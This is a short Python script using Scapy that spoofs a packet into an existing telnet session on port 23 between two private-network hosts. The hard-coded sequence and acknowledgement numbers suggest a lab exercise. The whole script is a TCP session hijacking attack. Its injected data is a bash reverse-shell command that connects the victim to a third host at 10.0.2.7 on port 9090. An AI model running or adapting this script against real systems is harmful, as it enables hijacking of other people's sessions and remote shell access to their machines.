#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=48986,dport=23,flags="A",seq=1493005543, ack=320185183, window=2000)
data = '\n/bin/bash -i > /dev/tcp/10.0.2.7/9090 0<&1 2>&1\n'
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)